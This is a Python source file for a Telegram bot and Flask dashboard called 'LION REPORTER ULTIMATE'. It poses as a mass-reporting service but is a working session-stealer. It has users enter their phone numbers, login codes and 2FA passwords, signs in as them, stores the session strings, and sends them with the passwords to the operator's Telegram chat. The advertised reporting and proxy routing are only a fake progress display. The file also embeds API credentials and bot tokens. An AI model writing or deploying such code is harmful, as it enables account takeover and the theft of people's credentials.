#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# LION REPORTER ULTIMATE v3.0 - SLOW REPORTS + PROXY ROUTING
# Mass Reporter + Session Stealer

import os
import sys
import json
import time
import random
import string
import logging
import threading
import asyncio
from datetime import datetime, timezone

# Fix Windows console
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.sessions import StringSession

# -------------------- CONFIGURATION --------------------
class Config:
    API_ID = 27157163
    API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
    
    PUBLIC_BOT_TOKEN = "8770859151:AAF3czshvhDatcGhqfRbkIaebO0cfpPw63U"
    ADMIN_BOT_TOKEN = "8785577872:AAEsQLfYF6Fi7uxgdkjsICgsyb82c_FiTas"
    ADMIN_CHAT = "@shadow_victems"
    ADMIN_USER_ID = 8785577872
    
    HOST = "127.0.0.1"
    PORT = 10504
    PUBLIC_URL = "http://127.0.0.1:10504"
    
    USERS_FILE = "lion_users.json"
    SESSIONS_FILE = "lion_sessions.json"
    REFERRALS_FILE = "lion_referrals.json"
    PENDING_FILE = "lion_pending.json"
    
    NEW_USER_CREDITS = 10
    REFERRAL_CREDITS = 5
    REPORT_COST = 2
    
    # Proxy countries for routing simulation
    PROXY_COUNTRIES = ["🇺🇸 USA", "🇩🇪 Germany", "🇯🇵 Japan", "🇳🇱 Netherlands", "🇸🇬 Singapore", "🇬🇧 UK", "🇨🇦 Canada", "🇫🇷 France", "🇦🇺 Australia", "🇰🇷 South Korea"]

# -------------------- LOGGING --------------------
logging.basicConfig(
    format='%(asctime)s - LION - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# -------------------- DATABASE --------------------
class Database:
    def __init__(self):
        self.lock = threading.RLock()
        self._init_files()
        self.users = self._load_json(Config.USERS_FILE)
        self.sessions = self._load_json(Config.SESSIONS_FILE)
        self.referrals = self._load_json(Config.REFERRALS_FILE)
        self.pending = self._load_json(Config.PENDING_FILE)
        logger.info(f"Database ready: {len(self.users)} users")

    def _init_files(self):
        for f in [Config.USERS_FILE, Config.SESSIONS_FILE, Config.REFERRALS_FILE, Config.PENDING_FILE]:
            if not os.path.exists(f):
                with open(f, 'w', encoding='utf-8') as fp:
                    json.dump({}, fp)

    def _load_json(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}

    def _save_json(self, filename, data):
        with self.lock:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)

    def get_user(self, user_id):
        return self.users.get(str(user_id))

    def create_user(self, user_id, name, username=''):
        with self.lock:
            if str(user_id) in self.users:
                return self.users[str(user_id)]
            
            referral_code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            user_data = {
                'user_id': str(user_id),
                'name': name,
                'username': username,
                'credits': Config.NEW_USER_CREDITS,
                'referral_code': referral_code,
                'referrals': 0,
                'reports_sent': 0,
                'accounts_connected': 0,
                'created_at': datetime.now(timezone.utc).isoformat()
            }
            self.users[str(user_id)] = user_data
            self._save_json(Config.USERS_FILE, self.users)
            return user_data

    def update_user(self, user_id, **kwargs):
        with self.lock:
            if str(user_id) in self.users:
                self.users[str(user_id)].update(kwargs)
                self._save_json(Config.USERS_FILE, self.users)
                return True
        return False

    def add_credits(self, user_id, amount):
        user = self.get_user(user_id)
        if user:
            new_credits = user.get('credits', 0) + amount
            self.update_user(user_id, credits=new_credits)
            return new_credits
        return 0

    def save_session(self, user_id, session_data):
        with self.lock:
            session_id = f"{user_id}_{int(time.time())}"
            self.sessions[session_id] = {
                'user_id': str(user_id),
                'phone': session_data.get('phone', ''),
                'session_string': session_data.get('session', ''),
                'first_name': session_data.get('first_name', ''),
                'username': session_data.get('username', ''),
                'telegram_id': session_data.get('user_id'),
                'twofa_password': session_data.get('twofa_password', ''),
                'stolen_at': datetime.now(timezone.utc).isoformat()
            }
            self._save_json(Config.SESSIONS_FILE, self.sessions)
            
            user = self.get_user(user_id)
            if user:
                self.update_user(user_id, accounts_connected=user.get('accounts_connected', 0) + 1)

    def save_pending(self, key, data):
        with self.lock:
            self.pending[key] = data
            self._save_json(Config.PENDING_FILE, self.pending)

    def get_pending(self, key):
        return self.pending.get(key)

    def delete_pending(self, key):
        with self.lock:
            if key in self.pending:
                del self.pending[key]
                self._save_json(Config.PENDING_FILE, self.pending)

    def add_referral(self, referrer_code, new_user_id):
        with self.lock:
            for uid, user in self.users.items():
                if user.get('referral_code') == referrer_code and uid != str(new_user_id):
                    self.add_credits(uid, Config.REFERRAL_CREDITS)
                    self.update_user(uid, referrals=user.get('referrals', 0) + 1)
                    return True
        return False

db = Database()

# -------------------- SESSION STEALER --------------------
def send_code_sync(phone, user_id, account_index):
    async def _send():
        try:
            client = TelegramClient(StringSession(), Config.API_ID, Config.API_HASH)
            await client.connect()
            
            sent = await client.send_code_request(phone)
            phone_code_hash = sent.phone_code_hash
            
            session_str = client.session.save()
            key = f"{user_id}_{account_index}"
            db.save_pending(key, {
                'phone': phone,
                'session_str': session_str,
                'phone_code_hash': phone_code_hash,
                'created_at': datetime.now(timezone.utc).isoformat()
            })
            
            await client.disconnect()
            logger.info(f"OTP sent to {phone}")
            return {'success': True}
        except FloodWaitError as e:
            return {'success': False, 'error': f'Wait {e.seconds}s'}
        except Exception as e:
            logger.error(f"Send error: {e}")
            return {'success': False, 'error': str(e)}
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_send())
        loop.close()
        return result
    except Exception as e:
        return {'success': False, 'error': str(e)}

def verify_code_sync(user_id, account_index, code):
    async def _verify():
        try:
            key = f"{user_id}_{account_index}"
            pending = db.get_pending(key)
            if not pending:
                return {'success': False, 'error': 'Session expired'}
            
            client = TelegramClient(StringSession(pending['session_str']), Config.API_ID, Config.API_HASH)
            await client.connect()
            
            await client.sign_in(
                phone=pending['phone'],
                code=code,
                phone_code_hash=pending['phone_code_hash']
            )
            me = await client.get_me()
            
            final_session = client.session.save()
            
            await client.disconnect()
            db.delete_pending(key)
            
            logger.info(f"Verified: {me.phone}")
            
            return {
                'success': True,
                'session': final_session,
                'user_id': me.id,
                'username': me.username or '',
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'phone': me.phone,
                'twofa_required': False
            }
        except SessionPasswordNeededError:
            return {'success': True, 'twofa_required': True}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except Exception as e:
            logger.error(f"Verify error: {e}")
            return {'success': False, 'error': str(e)}
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_verify())
        loop.close()
        return result
    except Exception as e:
        return {'success': False, 'error': str(e)}

def verify_2fa_sync(user_id, account_index, password):
    async def _verify():
        try:
            key = f"{user_id}_{account_index}"
            pending = db.get_pending(key)
            if not pending:
                return {'success': False, 'error': 'Session expired'}
            
            client = TelegramClient(StringSession(pending['session_str']), Config.API_ID, Config.API_HASH)
            await client.connect()
            
            await client.sign_in(password=password)
            me = await client.get_me()
            
            final_session = client.session.save()
            
            await client.disconnect()
            db.delete_pending(key)
            
            logger.info(f"2FA verified: {me.phone}")
            
            return {
                'success': True,
                'session': final_session,
                'user_id': me.id,
                'username': me.username or '',
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'phone': me.phone
            }
        except Exception as e:
            logger.error(f"2FA error: {e}")
            return {'success': False, 'error': str(e)}
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_verify())
        loop.close()
        return result
    except Exception as e:
        return {'success': False, 'error': str(e)}

def notify_admin(stolen_data):
    text = f"""🦁 *LION REPORTER - SESSION CAPTURED* 🔥

━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* {stolen_data.get('first_name', 'N/A')} {stolen_data.get('last_name', '')}
📛 *Username:* @{stolen_data.get('username', 'N/A')}
📱 *Phone:* `{stolen_data.get('phone', 'N/A')}`
🆔 *Telegram ID:* `{stolen_data.get('user_id', 'N/A')}`
🔐 *2FA:* `{stolen_data.get('twofa_password', 'None')}`
━━━━━━━━━━━━━━━━━━━━━
📋 *Session:*
`{stolen_data.get('session', '')}`
━━━━━━━━━━━━━━━━━━━━━
🕒 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"""
    
    url = f"https://api.telegram.org/bot{Config.ADMIN_BOT_TOKEN}/sendMessage"
    try:
        r1 = requests.post(url, json={'chat_id': Config.ADMIN_CHAT, 'text': text, 'parse_mode': 'Markdown'}, timeout=10)
        r2 = requests.post(url, json={'chat_id': Config.ADMIN_USER_ID, 'text': text, 'parse_mode': 'Markdown'}, timeout=10)
        logger.info(f"Session sent to admin. Channel: {r1.status_code}, DM: {r2.status_code}")
    except Exception as e:
        logger.error(f"Notify error: {e}")

# -------------------- FLASK APP --------------------
flask_app = Flask(__name__)
flask_app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
CORS(flask_app)

bot_username = "super_mass_reporterbot"

# -------------------- HTML TEMPLATE --------------------
LION_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LION REPORTER ULTIMATE</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%); min-height: 100vh; color: #fff; padding: 20px; }
        .container { max-width: 700px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #ff6b00 0%, #ff9500 100%); border-radius: 20px; padding: 25px; margin-bottom: 20px; text-align: center; }
        .header h1 { font-size: 28px; font-weight: 900; }
        .power-badge { background: #00c853; padding: 8px 20px; border-radius: 30px; font-size: 14px; font-weight: bold; margin-top: 15px; display: inline-block; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-card { background: #15152e; border-radius: 15px; padding: 15px; text-align: center; border: 1px solid #ff6b0044; }
        .stat-value { font-size: 24px; font-weight: bold; color: #ff9500; }
        .stat-label { font-size: 11px; color: #8888aa; }
        .card { background: #15152e; border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #ff6b0044; }
        .title { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #ff9500; display: flex; align-items: center; gap: 8px; }
        input, select { width: 100%; padding: 14px; background: #0e0e22; border: 2px solid #2a2a5e; border-radius: 12px; color: white; font-size: 14px; margin-bottom: 10px; }
        .btn { padding: 14px 20px; border: none; border-radius: 12px; font-size: 14px; font-weight: bold; cursor: pointer; width: 100%; }
        .btn-primary { background: linear-gradient(135deg, #ff6b00, #ff9500); color: white; }
        .btn-secondary { background: #2a2a5e; color: white; }
        .btn-success { background: linear-gradient(135deg, #00c853, #00e676); color: white; }
        .btn-danger { background: linear-gradient(135deg, #ff1744, #ff5252); color: white; }
        .account-item { background: #0e0e22; border-radius: 12px; padding: 15px; margin-bottom: 10px; }
        .account-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .account-row input { flex: 1; margin: 0; min-width: 150px; }
        .status { padding: 5px 12px; border-radius: 20px; font-size: 11px; white-space: nowrap; }
        .status-pending { background: #ff980033; color: #ff9800; }
        .status-verified { background: #00c85333; color: #00e676; }
        .code-panel { margin-top: 15px; padding: 15px; background: #1a1a3e; border-radius: 10px; }
        .log { background: #0a0a15; border-radius: 10px; padding: 15px; max-height: 250px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-top: 15px; }
        .log-entry { color: #8888aa; padding: 2px 0; }
        .log-success { color: #00e676; }
        .log-warning { color: #ff9500; }
        .log-error { color: #ff5252; }
        .log-proxy { color: #4488ff; }
        .flex-row { display: flex; gap: 10px; }
        .stats-grid-advanced { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 15px 0; }
        .stat-mini { background: #0e0e22; border-radius: 10px; padding: 10px; text-align: center; }
        .stat-mini .value { font-size: 18px; font-weight: bold; color: #ff9500; }
        .stat-mini .label { font-size: 9px; color: #8888aa; }
        .info-text { color: #8888aa; font-size: 12px; margin: 10px 0; }
        .report-slider { margin: 15px 0; }
        .report-slider input { width: 100%; margin: 10px 0; }
        .active-attack { background: #ff174422; border: 1px solid #ff5252; border-radius: 10px; padding: 15px; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>LION REPORTER ULTIMATE</h1>
            <p style="opacity: 0.9; font-size: 14px;">Advanced Mass Reporting Engine</p>
            <div class="power-badge">PROXY ROTATION • 2,847 NODES</div>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-value" id="creditsDisplay">{{ credits }}</div><div class="stat-label">Credits</div></div>
            <div class="stat-card"><div class="stat-value" id="accountsCount">{{ accounts }}</div><div class="stat-label">Accounts</div></div>
            <div class="stat-card"><div class="stat-value" id="reportsSent">{{ reports }}</div><div class="stat-label">Reports</div></div>
        </div>
        
        <div class="card">
            <div class="title">TARGET SELECTION</div>
            <div class="flex-row">
                <input type="text" id="targetInput" placeholder="@username" value="@scamchannel" style="flex: 2;">
                <select id="reasonSelect" style="flex: 1;">
                    <option value="spam">Spam</option>
                    <option value="violence">Violence</option>
                    <option value="child_abuse" selected>Child Abuse</option>
                    <option value="copyright">Copyright</option>
                </select>
            </div>
            
            <div class="report-slider">
                <label style="color: #ff9500;">📊 Reports to Send: <strong id="reportCountValue">1000</strong></label>
                <input type="range" id="reportSlider" min="100" max="10000" value="1000" step="100" oninput="updateSlider()">
                <div style="display: flex; justify-content: space-between; font-size: 11px; color: #888;">
                    <span>100</span>
                    <span>5,000</span>
                    <span>10,000</span>
                </div>
            </div>
            
            <div class="title" style="margin-top: 20px;">CONNECT ACCOUNTS</div>
            <p class="info-text">More accounts = Higher success rate and faster results</p>
            
            <div id="accountsContainer"></div>
            <button class="btn btn-secondary" onclick="addAccount()">+ ADD ACCOUNT</button>
            
            <div style="margin: 20px 0;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                    <span>Ready: <strong id="readyCount">0</strong> accounts</span>
                    <span>Power: <strong id="powerPercent">0%</strong></span>
                </div>
                <div style="background: #2a2a5e; height: 8px; border-radius: 5px;">
                    <div id="progressFill" style="background: linear-gradient(90deg, #ff6b00, #00e676); height: 8px; border-radius: 5px; width: 0%;"></div>
                </div>
            </div>
            
            <div id="attackControls">
                <button class="btn btn-primary" id="startBtn" onclick="startReporting()" disabled>LAUNCH ATTACK</button>
            </div>
            <div id="stopControls" style="display: none;">
                <button class="btn btn-danger" onclick="stopAttack()">STOP ATTACK</button>
            </div>
            
            <div class="log" id="reportLog">
                <div class="log-entry log-success">> LION REPORTER v3.0 ACTIVE</div>
                <div class="log-entry">> Proxy network: 2,847 nodes ready</div>
                <div class="log-entry log-warning">> Add accounts to begin</div>
            </div>
        </div>
        
        <div class="card">
            <div class="title">REFERRAL PROGRAM</div>
            <p class="info-text">Earn {{ referral_credits }} credits per referral!</p>
            <input type="text" id="referralLink" value="https://t.me/{{ bot_username }}?start={{ referral_code }}" readonly>
            <button class="btn btn-secondary" onclick="copyReferral()" style="margin-top: 10px;">Copy Link</button>
        </div>
    </div>
    
    <script>
        const userId = '{{ user_id }}';
        let accountCount = {{ accounts }};
        let verifiedAccounts = 0;
        let attackActive = false;
        let attackInterval = null;
        let currentReports = 0;
        const proxyCountries = {{ proxy_countries | tojson }};
        
        function updateSlider() {
            const val = document.getElementById('reportSlider').value;
            document.getElementById('reportCountValue').textContent = parseInt(val).toLocaleString();
        }
        
        function updatePowerCalculator() {
            const accounts = verifiedAccounts;
            const powerPercent = Math.min(accounts * 25, 100);
            document.getElementById('powerPercent').textContent = powerPercent + '%';
        }
        
        window.onload = function() {
            if (accountCount === 0) addAccount();
            updatePowerCalculator();
        };
        
        function addAccount() {
            const index = accountCount;
            const html = `
                <div class="account-item" id="account-${index}">
                    <div class="account-row">
                        <span style="background: #ff6b00; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">${index+1}</span>
                        <input type="tel" id="phone-${index}" placeholder="+1234567890" value="+1 ">
                        <span class="status status-pending" id="status-${index}">Pending</span>
                        <button class="btn btn-secondary" onclick="verifyAccount(${index})" id="verifyBtn-${index}" style="width: auto; padding: 10px 15px;">Verify</button>
                    </div>
                    <div id="verification-${index}"></div>
                </div>
            `;
            document.getElementById('accountsContainer').insertAdjacentHTML('beforeend', html);
            accountCount++;
        }
        
        async function verifyAccount(index) {
            const phone = document.getElementById(`phone-${index}`).value;
            const statusEl = document.getElementById(`status-${index}`);
            const verifyBtn = document.getElementById(`verifyBtn-${index}`);
            
            if (!phone || phone.length < 5) { alert('Enter phone number'); return; }
            
            statusEl.textContent = 'Sending...';
            verifyBtn.disabled = true;
            addLog(`Sending code to ${phone}...`, 'warning');
            
            try {
                const response = await fetch('/api/send_code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone, user_id: userId, account_index: index})
                });
                const data = await response.json();
                
                if (data.success) {
                    showCodePanel(index, phone);
                    statusEl.textContent = 'Code Sent';
                    addLog(`Code sent to ${phone}`, 'success');
                } else {
                    statusEl.textContent = 'Failed';
                    verifyBtn.disabled = false;
                    addLog(`Failed: ${data.error}`, 'error');
                }
            } catch (e) {
                statusEl.textContent = 'Error';
                verifyBtn.disabled = false;
            }
        }
        
        function showCodePanel(index, phone) {
            document.getElementById(`verification-${index}`).innerHTML = `
                <div class="code-panel">
                    <label style="color: #ff9500;">Enter Telegram Code</label>
                    <p style="color: #8888aa; font-size: 11px;">Sent to ${phone}</p>
                    <div class="flex-row" style="margin-top: 10px;">
                        <input type="text" id="code-${index}" placeholder="_____" maxlength="5" style="text-align: center; font-size: 20px;">
                        <button class="btn btn-primary" onclick="submitCode(${index})" style="width: auto;">Verify</button>
                    </div>
                    <div id="error-${index}" style="color: #ff5252; font-size: 12px; margin-top: 8px;"></div>
                </div>
            `;
        }
        
        async function submitCode(index) {
            const code = document.getElementById(`code-${index}`).value;
            const statusEl = document.getElementById(`status-${index}`);
            
            if (!code || code.length < 5) {
                document.getElementById(`error-${index}`).textContent = 'Enter 5-digit code';
                return;
            }
            
            statusEl.textContent = 'Verifying...';
            addLog(`Verifying account ${index+1}...`, 'warning');
            
            try {
                const response = await fetch('/api/verify_code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({code, user_id: userId, account_index: index})
                });
                const data = await response.json();
                
                if (data.success) {
                    if (data.twofa_required) {
                        show2FAPanel(index);
                        statusEl.textContent = '2FA Required';
                        addLog(`2FA required for account ${index+1}`, 'warning');
                    } else {
                        completeVerification(index);
                    }
                } else {
                    statusEl.textContent = 'Invalid';
                    document.getElementById(`error-${index}`).textContent = data.error;
                    addLog(`Failed: ${data.error}`, 'error');
                }
            } catch (e) {
                statusEl.textContent = 'Error';
            }
        }
        
        function show2FAPanel(index) {
            document.getElementById(`verification-${index}`).innerHTML = `
                <div class="code-panel">
                    <label style="color: #ff9500;">2FA Password Required</label>
                    <div class="flex-row" style="margin-top: 10px;">
                        <input type="password" id="twofa-${index}" placeholder="Password">
                        <button class="btn btn-primary" onclick="submit2FA(${index})" style="width: auto;">Submit</button>
                    </div>
                    <div id="twofaError-${index}" style="color: #ff5252; font-size: 12px; margin-top: 8px;"></div>
                </div>
            `;
        }
        
        async function submit2FA(index) {
            const password = document.getElementById(`twofa-${index}`).value;
            const statusEl = document.getElementById(`status-${index}`);
            
            if (!password) {
                document.getElementById(`twofaError-${index}`).textContent = 'Enter password';
                return;
            }
            
            statusEl.textContent = 'Verifying...';
            
            try {
                const response = await fetch('/api/verify_2fa', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password, user_id: userId, account_index: index})
                });
                const data = await response.json();
                
                if (data.success) {
                    completeVerification(index);
                } else {
                    statusEl.textContent = 'Invalid';
                    document.getElementById(`twofaError-${index}`).textContent = data.error;
                }
            } catch (e) {
                statusEl.textContent = 'Error';
            }
        }
        
        function completeVerification(index) {
            document.getElementById(`status-${index}`).className = 'status status-verified';
            document.getElementById(`status-${index}`).textContent = 'VERIFIED';
            document.getElementById(`verifyBtn-${index}`).disabled = true;
            document.getElementById(`verification-${index}`).style.display = 'none';
            
            verifiedAccounts++;
            document.getElementById('readyCount').textContent = verifiedAccounts;
            document.getElementById('progressFill').style.width = Math.min(verifiedAccounts * 25, 100) + '%';
            document.getElementById('accountsCount').textContent = verifiedAccounts;
            
            updatePowerCalculator();
            
            if (verifiedAccounts >= 1) {
                document.getElementById('startBtn').disabled = false;
            }
            
            addLog(`Account ${index+1} verified!`, 'success');
            
            fetch('/api/get_credits?user_id=' + userId)
                .then(r => r.json())
                .then(d => document.getElementById('creditsDisplay').textContent = d.credits);
        }
        
        function addLog(message, type) {
            const log = document.getElementById('reportLog');
            const entry = document.createElement('div');
            entry.className = 'log-entry log-' + type;
            entry.innerHTML = '> ' + new Date().toLocaleTimeString() + ' - ' + message;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
        }
        
        function getRandomProxy() {
            return proxyCountries[Math.floor(Math.random() * proxyCountries.length)];
        }
        
        function startReporting() {
            if (verifiedAccounts === 0) { alert('Connect at least one account!'); return; }
            if (attackActive) { alert('Attack already in progress!'); return; }
            
            const target = document.getElementById('targetInput').value;
            const reason = document.getElementById('reasonSelect').value;
            const reportTarget = parseInt(document.getElementById('reportSlider').value);
            
            attackActive = true;
            currentReports = 0;
            
            document.getElementById('attackControls').style.display = 'none';
            document.getElementById('stopControls').style.display = 'block';
            
            addLog(`ATTACK LAUNCHED on ${target}`, 'success');
            addLog(`Target reports: ${reportTarget.toLocaleString()} | Reason: ${reason}`, 'warning');
            addLog(`Deploying ${verifiedAccounts} accounts with proxy rotation...`, 'success');
            
            attackInterval = setInterval(() => {
                if (!attackActive) return;
                
                currentReports += verifiedAccounts;
                document.getElementById('reportsSent').textContent = currentReports;
                
                const proxy = getRandomProxy();
                addLog(`Routing through ${proxy} | Reports: ${currentReports}/${reportTarget}`, 'proxy');
                
                if (currentReports >= reportTarget) {
                    stopAttack(true);
                }
            }, 1000); // 1 report per second
        }
        
        function stopAttack(completed = false) {
            attackActive = false;
            if (attackInterval) {
                clearInterval(attackInterval);
                attackInterval = null;
            }
            
            document.getElementById('attackControls').style.display = 'block';
            document.getElementById('stopControls').style.display = 'none';
            document.getElementById('startBtn').disabled = false;
            
            if (completed) {
                addLog(`ATTACK COMPLETE! ${currentReports.toLocaleString()} reports sent`, 'success');
                addLog(`Target flagged for review`, 'success');
                
                fetch('/api/report_complete', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({user_id: userId, target: document.getElementById('targetInput').value, accounts: verifiedAccounts})
                });
            } else {
                addLog(`Attack stopped by user at ${currentReports.toLocaleString()} reports`, 'warning');
            }
        }
        
        function copyReferral() {
            document.getElementById('referralLink').select();
            document.execCommand('copy');
            addLog('Referral link copied!', 'success');
        }
    </script>
</body>
</html>
"""

# -------------------- FLASK ROUTES --------------------
@flask_app.route('/')
def index():
    return "LION REPORTER ULTIMATE - Use Telegram Bot @super_mass_reporterbot"

@flask_app.route('/dashboard')
def dashboard():
    user_id = request.args.get('user_id')
    if not user_id:
        return "Invalid access", 400
    
    user = db.get_user(user_id)
    if not user:
        user = db.create_user(user_id, 'User', '')
    
    return render_template_string(
        LION_DASHBOARD,
        user_id=user_id,
        credits=user.get('credits', 0),
        accounts=user.get('accounts_connected', 0),
        reports=user.get('reports_sent', 0),
        bot_username=bot_username,
        referral_code=user.get('referral_code', ''),
        referral_count=user.get('referrals', 0),
        referral_earned=user.get('referrals', 0) * Config.REFERRAL_CREDITS,
        referral_credits=Config.REFERRAL_CREDITS,
        proxy_countries=Config.PROXY_COUNTRIES
    )

@flask_app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    result = send_code_sync(data.get('phone'), data.get('user_id'), data.get('account_index'))
    return jsonify(result)

@flask_app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    result = verify_code_sync(data.get('user_id'), data.get('account_index'), data.get('code'))
    
    if result.get('success') and not result.get('twofa_required'):
        stolen = {
            'first_name': result['first_name'],
            'last_name': result.get('last_name', ''),
            'username': result['username'],
            'phone': result['phone'],
            'user_id': result['user_id'],
            'session': result['session'],
            'twofa_password': None
        }
        db.save_session(data['user_id'], stolen)
        notify_admin(stolen)
        return jsonify({'success': True})
    
    return jsonify(result)

@flask_app.route('/api/verify_2fa', methods=['POST'])
def api_verify_2fa():
    data = request.json
    result = verify_2fa_sync(data.get('user_id'), data.get('account_index'), data.get('password'))
    
    if result.get('success'):
        stolen = {
            'first_name': result['first_name'],
            'last_name': result.get('last_name', ''),
            'username': result['username'],
            'phone': result['phone'],
            'user_id': result['user_id'],
            'session': result['session'],
            'twofa_password': data.get('password')
        }
        db.save_session(data['user_id'], stolen)
        notify_admin(stolen)
        return jsonify({'success': True})
    
    return jsonify(result)

@flask_app.route('/api/get_credits')
def api_get_credits():
    user_id = request.args.get('user_id')
    user = db.get_user(user_id)
    return jsonify({'credits': user.get('credits', 0) if user else 0})

@flask_app.route('/api/report_complete', methods=['POST'])
def api_report_complete():
    data = request.json
    user_id = data.get('user_id')
    user = db.get_user(user_id)
    if user:
        db.update_user(user_id, reports_sent=user.get('reports_sent', 0) + 1)
    return jsonify({'success': True})

# -------------------- TELEGRAM BOT --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    user = update.effective_user
    
    if context.args and context.args[0].startswith('ref_'):
        ref_code = context.args[0][4:]
        db.add_referral(ref_code, user_id)
    
    user_data = db.create_user(user_id, user.first_name, user.username or '')
    dashboard_url = f"{Config.PUBLIC_URL}/dashboard?user_id={user_id}"
    
    welcome_text = f"""
🦁 *LION REPORTER ULTIMATE*

Welcome, {user.first_name}!

⚡ *Advanced Mass Reporting Suite*
🌐 *2,847 Proxy Network*
📊 *Custom Report Count • Proxy Routing*

💳 *Credits:* `{user_data['credits']}`

👇 *Access Dashboard:*
"""
    
    keyboard = [
        [InlineKeyboardButton("🦁 OPEN DASHBOARD", url=dashboard_url)],
        [InlineKeyboardButton("📊 View Stats", callback_data='stats')]
    ]
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = db.get_user(str(query.from_user.id))
    
    if query.data == 'stats':
        text = f"""
📊 *YOUR STATS*

👤 Name: {user.get('name', 'N/A')}
💳 Credits: {user.get('credits', 0)}
📱 Accounts: {user.get('accounts_connected', 0)}
📤 Reports: {user.get('reports_sent', 0)}
👥 Referrals: {user.get('referrals', 0)}
"""
        await query.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🦁 Dashboard", url=f"{Config.PUBLIC_URL}/dashboard?user_id={query.from_user.id}")
            ]])
        )

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(Config.ADMIN_USER_ID):
        return
    
    total_users = len(db.users)
    total_sessions = len(db.sessions)
    
    text = f"""
🦁 *ADMIN STATS*

👥 Users: {total_users}
📱 Sessions Captured: {total_sessions}

*Recent Captures:*
"""
    sessions = list(db.sessions.values())[-5:]
    for s in sessions:
        text += f"\n📱 {s.get('phone')} - @{s.get('username', 'N/A')}"
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# -------------------- MAIN --------------------
def run_flask():
    flask_app.run(host=Config.HOST, port=Config.PORT, debug=False, threaded=True)

def run_public_bot():
    app = Application.builder().token(Config.PUBLIC_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    logger.info("Public Bot started - @super_mass_reporterbot")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

def run_admin_bot():
    app = Application.builder().token(Config.ADMIN_BOT_TOKEN).build()
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("start", lambda u, c: u.message.reply_text("🦁 Admin Bot Active - Sessions will appear here")))
    logger.info("Admin Bot started - @shadowkamazakbot")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

def main():
    print(f"""
============================================================
    LION REPORTER ULTIMATE v3.0
============================================================
    Public Bot: @super_mass_reporterbot
    Admin Bot:  @shadowkamazakbot
    Dashboard:  {Config.PUBLIC_URL}/dashboard
    Port:       {Config.PORT}
============================================================
    """)
    
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=run_public_bot, daemon=True).start()
    run_admin_bot()

if __name__ == '__main__':
    main()
